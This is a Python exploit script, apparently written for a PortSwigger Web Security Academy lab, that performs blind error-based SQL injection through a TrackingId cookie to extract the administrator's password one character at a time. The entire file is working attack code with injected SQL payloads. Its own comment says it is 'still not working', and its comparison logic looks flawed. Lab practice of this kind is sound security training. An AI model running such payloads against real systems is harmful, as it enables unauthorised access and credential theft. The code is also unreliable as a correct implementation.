import string
import requests

# This script was written while resolving a lab on portswigger where it was requested to perform
# a blind SQL injection triggering conditional responses through errors. This script is inspired
# by the first one, SQLi_blind_triggering_conditional_resposes_exploit.py

# still not working

characters = string.digits + string.ascii_lowercase
url = "https://0aa600ff03e3aac8c0b005a2009f0002.web-security-academy.net/"
real_trackingid = "KtrFGb5C8DieMHcT"

found = False
i = 0
pwd = ""

while found == False:

	for char in characters:
		cookies_dict = {"TrackingId": f"{real_trackingid}' AND (SELECT CASE WHEN (username = 'administrator' AND SUBSTRING(password, 1, {i+1}) > '{pwd}{char}') THEN 1/0 ELSE 'a' END FROM users)='a"}
		response = requests.get(url, cookies=cookies_dict)
		
		if (b"Welcome back!") not in response.content:
			pwd += char
			print(pwd)
			cookies_dict = {"TrackingId": f"{real_trackingid}' AND (SELECT CASE WHEN (username = 'administrator' AND password = '{pwd}') THEN 1/0 ELSE 'a' END FROM users)='a"}
			cookies_dict = {"TrackingId": f"{real_trackingid}' AND (SELECT password FROM users WHERE username = 'administrator') = '{pwd}"}
			response = requests.get(url, cookies=cookies_dict)
		
			if (b"Welcome back!") in response.content:
				found = True
				print("Found!")

			break
	
	i += 1